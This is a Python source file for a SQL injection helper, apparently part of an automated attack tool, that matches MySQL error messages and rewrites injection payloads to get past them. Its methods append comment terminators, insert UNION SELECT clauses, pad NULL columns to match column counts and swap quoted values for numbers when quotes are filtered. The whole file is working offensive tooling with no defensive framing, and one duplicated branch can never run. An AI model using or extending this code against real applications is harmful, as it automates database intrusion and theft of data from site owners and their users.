import re

class SQLErrorRefiner:
    def __init__(self):
        # Patterns to match common MySQL specific errors and their fixes
        self.error_fixes = [
            {
                "pattern": r"right syntax to use near '([^']*)'", # MySQL Error 1064
                "fix_type": "SYNTAX_NEAR",
                "strategy": "Check for unclosed quotes or parentheses near the reported area."
            },
            {
                "pattern": r"quotes are not closed", # MySQL string unclosed
                "fix_type": "UNCLOSED_QUOTE",
                "strategy": "Add a closing quote or a comment character (--) to terminate the MySQL string."
            },
            {
                "pattern": r"different number of columns", # MySQL Error 1222
                "fix_type": "COLUMN_MISMATCH",
                "strategy": "Increase or decrease the number of NULLs in the UNION SELECT statement."
            },
            {
                "pattern": r"Unknown column '([^']*)' in 'where clause'", # MySQL Error 1054
                "fix_type": "UNKNOWN_COLUMN_WHERE",
                "strategy": "The identifier was interpreted as a column name because it lacked quotes. Replace it with a numeric equivalent or hex string."
            },
            {
                "pattern": r"Unknown column '([^']*)' in 'order clause'", # MySQL Error 1054
                "fix_type": "ORDER_BY_ERROR",
                "strategy": "The column index is too high. Reduce the number in ORDER BY."
            },
            {
                "pattern": r"Operand should contain 1 column\(s\)", # MySQL Error 1241
                "fix_type": "SUBQUERY_COLUMNS",
                "strategy": "Ensure subqueries only return a single column."
            }
        ]

    def refine(self, payload, error_msg):
        """Suggests a mutation strategy based on the specific SQL error."""
        for fix in self.error_fixes:
            match = re.search(fix["pattern"], error_msg, re.IGNORECASE)
            if match:
                # Capture the exact token causing the issue if applicable
                problem_token = match.group(1) if len(match.groups()) > 0 else None
                return {
                    "type": fix["fix_type"],
                    "strategy": fix["strategy"],
                    "problem_token": problem_token,
                    "original_payload": payload
                }
        return None

    def apply_fix(self, payload, fix_info):
        """Applies a heuristic or syntactic fix to the payload."""
        fix_type = fix_info["type"]
        problem_token = fix_info.get("problem_token")
        
        if fix_type == "UNCLOSED_QUOTE":
            if "'" in payload and not payload.endswith("-- -"):
                return payload + "-- -"
            if '"' in payload and not payload.endswith("#"):
                return payload + "#"
                
        elif fix_type == "SYNTAX_NEAR" and problem_token:
            # Grammar-based adjustment:
            # If MySQL choked near 'UNION', we likely need to add a space or close a quote before it.
            if "UNION" in problem_token.upper():
                return payload.replace("UNION", " ' UNION")
            if "SELECT" in problem_token.upper() and "UNION" not in payload.upper():
                return payload.replace("SELECT", " UNION SELECT")
        
        elif fix_type == "COLUMN_MISMATCH":
            # Syntactic feedback: Increase columns properly
            if "UNION SELECT" in payload.upper():
                # Attempt to parse cols and add one
                parts = re.split(r"(UNION\s+SELECT\s+)", payload, flags=re.IGNORECASE)
                if len(parts) >= 3:
                    return f"{parts[0]}{parts[1]}{parts[2]},NULL"
                    
        elif fix_type == "UNKNOWN_COLUMN_WHERE" and problem_token:
            # The database parsed a string like 'admin' as a column because quotes were stripped.
            # To fix the SQL syntax statically when quotes are banned, we replace the specific offending "column" with a truthy number.
            return re.sub(rf'\b{re.escape(problem_token)}\b', "1", payload, flags=re.IGNORECASE)
        
        elif fix_type == "SYNTAX_NEAR" and problem_token:
            # Heuristic: If we have backslash explosion (\\\\), reduce to a single one
            if payload.count("\\") > 2:
                # Reduce multiple leading backslashes to a single one
                fixed = re.sub(r'^\\+', r'\\', payload)
                if fixed != payload: return fixed
            
            # Heuristic: If we are missing a space near the error token
            if problem_token and problem_token in payload:
                # Try adding a space before the token
                return payload.replace(problem_token, " " + problem_token)

        return payload # Default: no change, let the AST handle it
